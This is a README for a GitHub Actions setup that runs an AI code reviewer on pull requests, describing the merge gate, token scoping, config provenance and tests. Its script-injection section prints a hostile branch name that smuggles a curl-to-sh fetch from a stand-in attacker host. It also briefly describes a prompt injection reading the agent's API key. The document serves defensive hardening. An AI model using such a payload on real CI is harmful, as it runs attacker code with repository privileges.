# AI Code Review — GitHub Actions packaging

Everything needed to run the reviewer unattended on pull requests, with the
check-run conclusion as the merge gate.

## Adopting it

Copy [`examples/consumer-workflow.yml`](examples/consumer-workflow.yml) to
`.github/workflows/ai-review.yml`. The part you write is ten lines:

```yaml
jobs:
  review:
    uses: medtrics/ai-code-review/.github/workflows/ai-review.yml@v1
    with:
      app_id: ${{ vars.AI_REVIEW_APP_ID }}
      dry_run: true
      blocking: false
    secrets:
      app_private_key: ${{ secrets.AI_REVIEW_APP_PRIVATE_KEY }}
      anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
```

The triggers and the `concurrency` block in that example are not boilerplate.
Read the comments before trimming them.

### Prerequisites

- A GitHub App installed on the repo with **Contents: read**, **Pull requests:
  read & write**, **Checks: read & write**. Its ID goes in a repository or org
  variable (`AI_REVIEW_APP_ID`) and its private key in a secret.
- `ANTHROPIC_API_KEY` as a secret. This is not optional: `claude --bare`
  requires it and fails `Not logged in` without one. It does not read
  subscription login or the keychain.
- `ubuntu-latest`. The runner needs `python3`, `git`, `npm` and coreutils
  `timeout`, all of which are preinstalled. There is no `pip install`:
  `packages/core` and everything in `scripts/` are stdlib-only.

### Rolling it out

1. Start with `dry_run: true` and `blocking: false`, the defaults. Findings are
   computed and shown in the check run; nothing is posted to the pull request.
2. Read a dozen runs. If the signal is poor, tune `severity_floor` or the
   rulepack set in `.github/ai-review.yml` on the **base branch**.
3. Set `dry_run: false`. Reviews now post as `COMMENT`.
4. Only then consider `blocking: true`, and only then mark **AI Review** a
   required check.

Steps 3 and 4 are separate on purpose. A reviewer that posts is reversible; a
reviewer that blocks merges is an outage when it is wrong.

## Why Actions rather than a hosted App

Deliberate re-scope. A hosted service would have to hand-build the queue,
retries, secret storage, per-repo opt-in and ephemeral isolation. Actions
supplies all five, so this leans on the platform instead of reimplementing it:

- **Queue and retries** — the Actions scheduler and `re-run failed jobs`.
- **Debouncing** — `concurrency` with `cancel-in-progress`, not a timer.
- **Secret storage** — repository and organisation secrets.
- **Opt-in** — a repo gets reviewed when it adds the workflow file.
- **Isolation** — a fresh runner per pull request, destroyed afterwards.

## The merge gate

The gate is the **check-run conclusion**, not the review state. Reviews post as
`COMMENT` and there is no `APPROVE` path, because a GitHub App's approval
counts toward `required_approving_review_count` — the bot must never be able to
satisfy a human-review requirement.

Of GitHub's conclusions, `failure`, `cancelled`, `timed_out` and
`action_required` block a required check. `success`, `neutral` and `skipped` do
not. The full mapping, implemented in
[`scripts/render_summary.py`](scripts/render_summary.py) and tested
exhaustively:

| Outcome | `blocking: false` (default) | `blocking: true` |
|---|---|---|
| review completed | `neutral` | the run record's conclusion, clamped |
| review completed, run incomplete | `neutral` | `neutral` (never `success`) |
| policy refusal (disabled, over caps) | `neutral` | `neutral` |
| agent failed | `neutral` | `neutral` |
| timed out | `neutral` | `neutral` |
| cancelled / superseded | `neutral` | `neutral` |
| infrastructure error | `neutral` | `neutral` |
| skipped (draft, fork, disabled) | `skipped` | `skipped` |

Three properties are load-bearing.

**Infrastructure failure never blocks.** An agent crash, an API outage or a
timeout concludes `neutral` even in blocking mode. A check stuck or red during
an outage makes every open pull request unmergeable; a missing review does not.

**Failing open never means `success`.** `neutral` says "no answer"; `success`
says "reviewed and clean". A green check nobody earned is the same class of
mistake as letting the bot approve, so no error path can reach `success`. The
same clamp applies when the diff was truncated: unreviewed is not clean.

**`cancelled` and `timed_out` are never emitted.** Both block, and
`cancel-in-progress` means cancellation is something this system causes on
purpose, on essentially every push. A superseded run concludes `neutral` with a
"superseded" summary.

Because non-blocking mode concludes `neutral` whatever the reviewer found, the
check's colour carries no signal. The first line of `output.summary` does: it
is either `## No findings` or `## 6 findings (2 high, 4 medium)`.

## No check run is ever left pending

A required check stuck `in_progress` blocks merging on every affected pull
request. That is worse than a missing review, and it is the failure that
happens by accident. Four mechanisms, in order of how often they fire:

1. **`if: always()` on the finalizer.** Runs even when the job is cancelled,
   which is the case that matters because `cancel-in-progress` fires on every
   push.
2. **A four-tier fallback** in [`scripts/check_run.py`](scripts/check_run.py):
   rich PATCH → PATCH with output dropped (a 422 usually means oversized
   output, and the conclusion matters more than the prose) → POST an
   already-completed run (when creation itself failed) → exit 2 naming exactly
   what is stuck.
3. **The `closed` trigger** runs the action in `mode: reap`, so a pull request
   merged or abandoned mid-review leaves nothing dangling.
4. **An optional scheduled sweeper**,
   [`examples/reaper-workflow.yml`](examples/reaper-workflow.yml), for the one
   case none of the above survives: the runner disappearing outright. Install
   it if you have marked the check required.

## Config comes from the base ref

`.github/ai-review.yml` is read from the **merge-base of the base branch and
the head**, never from the pull request head. Read from the head, a contributor
could disable the security reviewer, raise the severity floor or flip `dry_run`
in the very pull request that needs reviewing.

The merge-base rather than the base branch tip: the tip moves under an open
pull request, so policy would silently change because somebody else merged
something.

If the pull request modifies the config, the run uses the base version and the
check-run summary says so, naming the ref it used. If the merge-base cannot be
established at all, the action reports `repo_layer_source: "pr-head"` and core
refuses to apply the layer — it never guesses `base-ref`.

Enforcement of *which keys a repo may set* lives in
`packages/core/aireview/config.py`, which has the adversarial tests for it.
This layer only decides provenance and converts YAML to JSON, which it must do
because core is stdlib-only and the standard library has no YAML parser.

### The config YAML subset

[`scripts/minyaml.py`](scripts/minyaml.py) implements a deliberately small
subset: block and flow sequences of scalars, nested block mappings, quoted and
bare scalars, comments. It **refuses** anchors, aliases, merge keys, custom
tags, block scalars, flow mappings, tab indentation, multi-document streams and
duplicate keys, and enforces size, line and depth caps.

This is a parsing restriction, not a security boundary — core does the security
enforcement. But a YAML bomb fails here rather than reaching core, and
duplicate keys are an error because "the last one silently wins" is how an
override gets past a reviewer skimming a policy diff.

## Fork pull requests are skipped

**Decision: skip, with a `skipped` check run and an explanation.**

A `pull_request` from a fork gets a read-only `GITHUB_TOKEN` and no secrets, by
GitHub's design. Without secrets there is no Anthropic key and no App key, so
there is nothing to run the reviewer with and nothing to post with.

**`pull_request_target` is not an option and is banned in this repository.** It
runs with base-repo privileges in the context of the base branch, with secrets
available, against code the fork author controls. Using it to review forks
hands a fork author the App's private key. A test
(`test_no_pull_request_target_trigger`) and a CI grep enforce the ban.

The safe way to cover forks is a `workflow_run` follow-up: the untrusted job
produces an artifact with no credentials, and a separate privileged workflow
consumes it. That is a larger design and is **not implemented here**. Until it
is, fork pull requests get a `skipped` check and need a human.

## Tokens

Installation tokens are minted twice, in separate steps:

- **Before fetch** — `contents: read`, `checks: write`,
  `pull-requests: read`. Opens the check run and fetches the pull request.
- **Immediately before posting** — `contents: read`, `checks: write`,
  `pull-requests: write`. Installation tokens expire after an hour, so a long
  review that reused the first one would post with a dead token, which looks
  from the outside like a silently dropped review.

The step that runs the agent sits between them and its `env:` block is three
lines: `ANTHROPIC_API_KEY`, `PYTHONPATH`, and the timeout. No GitHub token, no
App ID, no private key — not "set but ignored", but absent from the process
environment. That is a property of the process tree, and
`test_the_agent_step_has_no_github_credential` keeps it that way.

The pull request is checked out with `persist-credentials: false`. The checkout
is attacker-authored and the parent reads `.env`, `.git/config`, `.claude/` and
`.mcp.json` out of it, so a token written into `.git/config` would be sitting
inside the blast radius.

### Residual risk, stated plainly

A successful prompt injection can read `ANTHROPIC_API_KEY` from its own
environment. It cannot reach GitHub, cannot post, and cannot merge — but it can
burn quota. Use a **dedicated Anthropic key for this workflow**, with its own
spend cap and rotation schedule, so the worst case is a bill rather than a
breach.

### Script injection

No dynamic value is interpolated into a `run:` body anywhere in this
workstream. Everything arrives through `env:` and is referenced as `"$VAR"`.

This is not stylistic. `git check-ref-format` forbids spaces, `~`, `^`, `:`,
`?`, `*`, `[` and `\` in a ref name — but permits `;`, `&`, `|`, `$`,
backticks, parentheses and both quote characters, and `$IFS` substitutes for
the forbidden space. A branch named

```
evil";curl$IFS-s$IFSattacker.example/x|sh;#
```

is legal, and an outside contributor chooses it. `${{ github.head_ref }}`
inside a `run:` body pastes it into the shell source the runner executes.
`test_no_run_block_interpolates_an_expression` scans every workflow, every
example and `action.yml` for the pattern.

## Triggers and concurrency

```yaml
on:
  pull_request:
    types: [opened, reopened, ready_for_review, synchronize, closed]
```

The default set is `opened`/`reopened`/`synchronize`. It omits
`ready_for_review`, so a draft marked ready would never be reviewed, and
`closed`, which is how dangling check runs get cleaned up.

Drafts are skipped by default (`opened` fires for drafts, and reviewing work in
progress is the easiest way to burn the budget). Marking the pull request ready
fires `ready_for_review` and the review runs then.

```yaml
concurrency:
  group: ai-review-${{ github.event.pull_request.number }}
  cancel-in-progress: true
```

This is the debounce: ten pushes to a branch cost one review. It also solves
in-flight supersede, because a push landing mid-review cancels the stale run
rather than letting it post findings against a SHA that has already moved. The
reusable workflow sets a job-level group as a backstop for consumers who omit
this.

## Inputs

Everything below is an input to both the composite action and the reusable
workflow. Review policy inputs set org defaults that `.github/ai-review.yml`
can refine; safety switches are org-controlled and a repo file can never
override them.

**Review policy:** `rulepacks`, `severity_floor` (`medium`), `model_tier`
(`standard`), `max_changed_files` (`400`), `reviewer_timeout_seconds` (`600`),
`max_budget_usd`.

**Safety switches:** `dry_run` (**`true`**), `blocking` (**`false`**),
`enabled` (`true`), `kill_switch` (`false`), `skip_forks` (**`true`**),
`skip_drafts` (**`true`**).

**Plumbing:** `mode` (`review` | `reap`), `check_name` (`AI Review` — this is
the string you mark required), `config_path`, `work_dir`,
`claude_code_version` (`2.1.175`, pinned deliberately),
`job_timeout_seconds` (`1800`).

**Outputs:** `run_record_path`, `verdict`, `check_conclusion`, `outcome`.

## Interface to `packages/core`

The action consumes [`contracts/run-record.schema.json`](../contracts/run-record.schema.json)
and re-derives nothing from it. It drives core through three phases, which is
how "no GitHub token in the agent's process" becomes structural rather than a
convention:

```
python3 -m aireview fetch  --repo O/N --pr N --out <dir>            # GITHUB_TOKEN
python3 -m aireview review --prfetch <dir>/prfetch.json \
                           --config resolved-config.json \
                           --out run-record.json                     # ANTHROPIC_API_KEY only
python3 -m aireview post   --run-record run-record.json [--dry-run]  # GITHUB_TOKEN
```

Exit codes: `0` success, `1` policy refusal (mapped to `neutral`, not an
error), `2` genuine failure.

The config document handed to `review` is:

```json
{
  "org_layer":         { "dry_run": true, "blocking_mode": false, "...": "..." },
  "repo_layer":        { "severity_floor": "high" },
  "repo_layer_source": "base-ref"
}
```

`repo_layer_source` is `"base-ref"` or `"pr-head"` and is always accurate. Core
treats it as load-bearing: a `pr-head` layer is parsed for reporting and never
applied.

## Testing

```bash
python3 -m unittest discover -s action/tests -t action/tests   # 100 tests
python3 tools/stdlib_lint.py packages/core
actionlint                                                     # workflows
actionlint action/examples/*.yml
```

`actionlint` does not cover composite `action.yml`, which is where most of this
workstream's shell lives. `test_workflow_hygiene.py` closes that gap: it runs
`shellcheck` over every `run:` block in `action.yml` (skipped when shellcheck
is absent) and enforces the no-interpolation rule across every YAML file here.

`.github/workflows/self-test.yml` runs all of the above in CI and then runs the
composite action itself on a real `pull_request` payload with `enabled: false`,
asserting the check run reached a completed state. A unit test cannot catch a
mistyped step `id` or an `if:` that never fires; that smoke job can.

## Files

```
action/
  action.yml                      composite action — the whole lifecycle
  scripts/
    check_run.py                  create / complete / reap; the never-pending ladder
    render_summary.py             run record -> conclusion + check output
    resolve_config.py             base-ref config -> layered JSON for core
    minyaml.py                    restricted YAML subset
    gh.py                         stdlib REST client, retries and backoff
  tests/                          100 tests, stdlib unittest
  examples/
    consumer-workflow.yml         copy this into your repo
    reaper-workflow.yml           optional; install if the check is required
.github/workflows/
  ai-review.yml                   the reusable workflow_call workflow
  ai-review-self.yml              dogfood: this repo reviews itself
  self-test.yml                   lint, unit, fixture, smoke
```
